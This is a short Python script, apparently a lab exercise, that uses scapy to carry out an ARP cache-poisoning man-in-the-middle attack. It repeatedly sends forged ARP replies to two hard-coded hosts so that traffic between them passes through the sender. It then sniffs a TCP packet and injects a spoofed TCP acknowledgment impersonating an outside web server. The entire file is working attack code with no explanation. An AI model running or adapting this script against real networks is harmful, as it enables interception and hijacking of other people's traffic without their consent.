import os
import re
import time
from scapy.all import *
from uuid import getnode


def arp():
	mac = getnode()
	mac = ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))

	stream = os.popen('arp -a')

	vip = []
	vmac = []

	lines = stream.readline()
	while lines:
		line = lines.split()
		line[1] = re.sub('[()]', '', line[1])
		vip.append(line[1])
		vmac.append(line[3])
		lines = stream.readline()

	p = []
	# for i in range(len(vip)):
	p.append(Ether(dst='00:0c:29:e4:f0:86', src=mac)/ARP(pdst='10.0.2.4', psrc='10.0.2.1', 
		hwdst='00:0c:29:e4:f0:86', hwsrc=mac, op=2))
	for i in range(10):
		print('send arp ', i)
		sendp(Ether(dst='00:0c:29:e4:f0:86', src=mac)/ARP(pdst='10.0.2.4', psrc='10.0.2.1', 
		hwdst='00:0c:29:e4:f0:86', hwsrc=mac, op=2))
		sendp(Ether(dst='00:50:56:c0:00:08', src=mac)/ARP(pdst='10.0.2.1', psrc='10.0.2.4', 
		hwdst='00:50:56:c0:00:08', hwsrc=mac, op=2))
		time.sleep(0.1)

def middle_man():
	s = sniff(count=0, store=1, stop_filter = lambda x: x.haslayer(TCP), lfilter = lambda x: x.haslayer(TCP))
	s.show()
	dstport = s[0][TCP].sport
	seqq = s[0][TCP].seq
	result, un = sr(IP(src='140.113.207.246', dst='10.0.2.4')/
		TCP(sport=80, dport=dstport, ack=seqq + 1, seq=300, flags='A'))
	result.show()


arp()
middle_man()